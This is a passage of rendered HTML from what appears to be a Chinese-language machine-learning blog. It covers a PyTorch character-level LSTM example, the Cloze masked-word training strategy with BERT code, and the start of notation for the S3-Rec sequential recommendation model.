class_\">TextDataset</span>(<span class=\"title class_ inherited__\">Dataset</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, text, seq_length</span>):</span><br><span class=\"line\">        chars = <span class=\"built_in\">sorted</span>(<span class=\"built_in\">list</span>(<span class=\"built_in\">set</span>(text)))</span><br><span class=\"line\">        self.char_to_idx = &#123;ch: idx <span class=\"keyword\">for</span> idx, ch <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(chars)&#125;</span><br><span class=\"line\">        self.idx_to_char = &#123;idx: ch <span class=\"keyword\">for</span> idx, ch <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(chars)&#125;</span><br><span class=\"line\">        self.vocab_size = <span class=\"built_in\">len</span>(chars)</span><br><span class=\"line\">        self.data = [self.char_to_idx[ch] <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> text]</span><br><span class=\"line\">        self.seq_length = seq_length</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__len__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">len</span>(self.data) - self.seq_length</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__getitem__</span>(<span class=\"params\">self, idx</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            torch.tensor(self.data[idx:idx+self.seq_length], dtype=torch.long),</span><br><span class=\"line\">            torch.tensor(self.data[idx+<span class=\"number\">1</span>:idx+self.seq_length+<span class=\"number\">1</span>], dtype=torch.long),</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义模型</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">CharRNN</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, vocab_size, embed_size, hidden_size, num_layers</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(CharRNN, self).__init__()</span><br><span class=\"line\">        self.embedding = nn.Embedding(vocab_size, embed_size)</span><br><span class=\"line\">        self.rnn = nn.LSTM(embed_size, hidden_size, num_layers, batch_first=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        self.fc = nn.Linear(hidden_size, vocab_size)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = self.embedding(x)</span><br><span class=\"line\">        output, _ = self.rnn(x)</span><br><span class=\"line\">        output = self.fc(output)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 示例文本数据</span></span><br><span class=\"line\">text = <span class=\"string\">&quot;hello world&quot;</span></span><br><span class=\"line\">seq_length = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建数据集和数据加载器</span></span><br><span class=\"line\">dataset = TextDataset(text, seq_length)</span><br><span class=\"line\">dataloader = DataLoader(dataset, batch_size=<span class=\"number\">2</span>, shuffle=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 模型、损失函数和优化器</span></span><br><span class=\"line\">vocab_size = dataset.vocab_size</span><br><span class=\"line\">embed_size = <span class=\"number\">8</span></span><br><span class=\"line\">hidden_size = <span class=\"number\">16</span></span><br><span class=\"line\">num_layers = <span class=\"number\">2</span></span><br><span class=\"line\">model = CharRNN(vocab_size, embed_size, hidden_size, num_layers)</span><br><span class=\"line\">criterion = nn.CrossEntropyLoss()</span><br><span class=\"line\">optimizer = optim.Adam(model.parameters(), lr=<span class=\"number\">0.001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 训练过程</span></span><br><span class=\"line\">num_epochs = <span class=\"number\">100</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_epochs):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> inputs, targets <span class=\"keyword\">in</span> dataloader:</span><br><span class=\"line\">        outputs = model(inputs)</span><br><span class=\"line\">        loss = criterion(outputs.view(-<span class=\"number\">1</span>, vocab_size), targets.view(-<span class=\"number\">1</span>))</span><br><span class=\"line\">        optimizer.zero_grad()</span><br><span class=\"line\">        loss.backward()</span><br><span class=\"line\">        optimizer.step()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (epoch + <span class=\"number\">1</span>) % <span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Epoch [<span class=\"subst\">&#123;epoch + <span class=\"number\">1</span>&#125;</span>/<span class=\"subst\">&#123;num_epochs&#125;</span>], Loss: <span class=\"subst\">&#123;loss.item():<span class=\"number\">.4</span>f&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 推断示例</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_text</span>(<span class=\"params\">model, start_seq, length, dataset</span>):</span><br><span class=\"line\">    model.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\">    <span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">        input_seq = torch.tensor([dataset.char_to_idx[ch] <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> start_seq], dtype=torch.long).unsqueeze(<span class=\"number\">0</span>)</span><br><span class=\"line\">        generated_text = start_seq</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">            output = model(input_seq)</span><br><span class=\"line\">            _, predicted_idx = torch.<span class=\"built_in\">max</span>(output[:, -<span class=\"number\">1</span>, :], dim=<span class=\"number\">1</span>)</span><br><span class=\"line\">            predicted_char = dataset.idx_to_char[predicted_idx.item()]</span><br><span class=\"line\">            generated_text += predicted_char</span><br><span class=\"line\">            input_seq = torch.cat((input_seq[:, <span class=\"number\">1</span>:], predicted_idx.unsqueeze(<span class=\"number\">0</span>).unsqueeze(<span class=\"number\">1</span>)), dim=<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> generated_text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生成文本</span></span><br><span class=\"line\">start_seq = <span class=\"string\">&quot;hello&quot;</span></span><br><span class=\"line\">generated_text = generate_text(model, start_seq, <span class=\"number\">5</span>, dataset)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Generated text: <span class=\"subst\">&#123;generated_text&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"cloze学习策略\"><a class=\"anchor\" href=\"#cloze学习策略\">#</a> Cloze 学习策略</h2>\n<p>Cloze 学习策略是一种基于填空任务的自然语言处理技术，通常用于训练语言模型和增强文本理解能力。其核心思想是从文本中随机掩盖（或移除）某些词汇，并要求模型根据上下文来预测这些被掩盖的词汇。Cloze 任务的主要目的是让模型学习语言的上下文信息，提高其在文本生成和理解任务中的表现。</p>\n<h3 id=\"cloze-学习策略的原理\"><a class=\"anchor\" href=\"#cloze-学习策略的原理\">#</a> Cloze 学习策略的原理</h3>\n<p><strong>数据预处理</strong>：从大量文本数据中随机选择一些词汇进行掩盖，形成训练样本。</p>\n<p><strong>模型训练</strong>：使用语言模型（如 BERT、GPT 等）对这些掩盖的词汇进行预测，训练模型根据上下文信息来填补这些缺失的部分。</p>\n<p><strong>损失函数计算</strong>：计算模型预测的词汇与实际词汇之间的差异，通常使用交叉熵损失函数。</p>\n<p><strong>模型优化</strong>：通过反向传播算法更新模型参数，使得模型能够更好地根据上下文信息进行词汇预测。</p>\n<h3 id=\"代码实现基于bert模型\"><a class=\"anchor\" href=\"#代码实现基于bert模型\">#</a> 代码实现（基于 BERT 模型）</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> transformers <span class=\"keyword\">import</span> BertTokenizer, BertForMaskedLM</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.utils.data <span class=\"keyword\">import</span> DataLoader, Dataset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 自定义数据集</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ClozeDataset</span>(<span class=\"title class_ inherited__\">Dataset</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, texts, tokenizer, max_length=<span class=\"number\">512</span></span>):</span><br><span class=\"line\">        self.texts = texts</span><br><span class=\"line\">        self.tokenizer = tokenizer</span><br><span class=\"line\">        self.max_length = max_length</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__len__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">len</span>(self.texts)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__getitem__</span>(<span class=\"params\">self, idx</span>):</span><br><span class=\"line\">        text = self.texts[idx]</span><br><span class=\"line\">        encoding = self.tokenizer(text, return_tensors=<span class=\"string\">&#x27;pt&#x27;</span>, max_length=self.max_length, truncation=<span class=\"literal\">True</span>, padding=<span class=\"string\">&#x27;max_length&#x27;</span>)</span><br><span class=\"line\">        input_ids = encoding[<span class=\"string\">&#x27;input_ids&#x27;</span>].squeeze()</span><br><span class=\"line\">        attention_mask = encoding[<span class=\"string\">&#x27;attention_mask&#x27;</span>].squeeze()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 随机掩盖一些词</span></span><br><span class=\"line\">        labels = input_ids.clone()</span><br><span class=\"line\">        rand = torch.rand(input_ids.shape)</span><br><span class=\"line\">        mask_arr = (rand &lt; <span class=\"number\">0.15</span>) * (input_ids != <span class=\"number\">101</span>) * (input_ids != <span class=\"number\">102</span>) * (input_ids != <span class=\"number\">0</span>)  <span class=\"comment\"># 不掩盖特殊标记</span></span><br><span class=\"line\">        selection = torch.flatten(mask_arr.nonzero()).tolist()</span><br><span class=\"line\">        input_ids[selection] = <span class=\"number\">103</span>  <span class=\"comment\"># 掩盖的词替换为 [MASK] 标记</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;input_ids&#x27;</span>: input_ids,</span><br><span class=\"line\">            <span class=\"string\">&#x27;attention_mask&#x27;</span>: attention_mask,</span><br><span class=\"line\">            <span class=\"string\">&#x27;labels&#x27;</span>: labels</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 准备数据</span></span><br><span class=\"line\">texts = [<span class=\"string\">&quot;Hello, how are you?&quot;</span>, <span class=\"string\">&quot;I am fine, thank you.&quot;</span>, <span class=\"string\">&quot;What is your name?&quot;</span>]</span><br><span class=\"line\">tokenizer = BertTokenizer.from_pretrained(<span class=\"string\">&#x27;bert-base-uncased&#x27;</span>)</span><br><span class=\"line\">dataset = ClozeDataset(texts, tokenizer)</span><br><span class=\"line\">dataloader = DataLoader(dataset, batch_size=<span class=\"number\">2</span>, shuffle=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载模型</span></span><br><span class=\"line\">model = BertForMaskedLM.from_pretrained(<span class=\"string\">&#x27;bert-base-uncased&#x27;</span>)</span><br><span class=\"line\">model.train()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义优化器</span></span><br><span class=\"line\">optimizer = torch.optim.AdamW(model.parameters(), lr=<span class=\"number\">1e-5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 训练模型</span></span><br><span class=\"line\">epochs = <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(epochs):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> batch <span class=\"keyword\">in</span> dataloader:</span><br><span class=\"line\">        optimizer.zero_grad()</span><br><span class=\"line\">        input_ids = batch[<span class=\"string\">&#x27;input_ids&#x27;</span>]</span><br><span class=\"line\">        attention_mask = batch[<span class=\"string\">&#x27;attention_mask&#x27;</span>]</span><br><span class=\"line\">        labels = batch[<span class=\"string\">&#x27;labels&#x27;</span>]</span><br><span class=\"line\">        </span><br><span class=\"line\">        outputs = model(input_ids=input_ids, attention_mask=attention_mask, labels=labels)</span><br><span class=\"line\">        loss = outputs.loss</span><br><span class=\"line\">        loss.backward()</span><br><span class=\"line\">        optimizer.step()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Epoch: <span class=\"subst\">&#123;epoch + <span class=\"number\">1</span>&#125;</span>, Loss: <span class=\"subst\">&#123;loss.item()&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Training complete&quot;</span>)</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"s3-rec\"><a class=\"anchor\" href=\"#s3-rec\">#</a> <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>S</mi><mn>3</mn></msup><mo>−</mo><mi>R</mi><mi>e</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">S^3-Rec</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span></span></span></span></h1>\n<h2 id=\"基础符号概念\"><a class=\"anchor\" href=\"#基础符号概念\">#</a> 基础符号概念</h2>\n<ul>\n<li>用户<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">U</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{U}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.09931em;\">U</span></span></span></span></span> 和物品<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">I</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{I}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.07382em;\">I</span></span></span></span></span> 按时间顺序排列的互动序列为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">{i_1,...,i_n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 是互动次数，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">i_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80952em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是与用户<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi></mrow><annotation encoding=\"application/x-tex\">u</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">u</span></span></span></span> 互动的第 t 个物品</li>\n<li i_j,...,i_k\\=\"\">用<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mrow><mi>j</mi><mo>:</mo><mi>k</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">i_{j:k}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9456279999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">:</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示子序列\\</li>\n<li>每个项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 与多个属性<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"script\">A</mi><mi>i</mi></msub><mo>=</mo><mo stretchy=\"false\">{</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>a</mi><mi>m</mi></msub><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\mathcal A_i=\\{a_1,...,a_m\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">}</span></span></span></span> 相关（例如，一首歌曲通常带有艺术家、专辑、音乐推荐器流行度等辅助信息）</li>\n<li>所有的属性构成属性集<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">A</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathcal\">A</span></span></span></span></li>\n<li>如果给定用户的历史行为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">{</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>n</mi></msub><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\{i_1,...,i_n\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">}</span></span></span></span> 和每个项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的属性<span class=\"katex\"><span class=\"katex-mathml\"><math 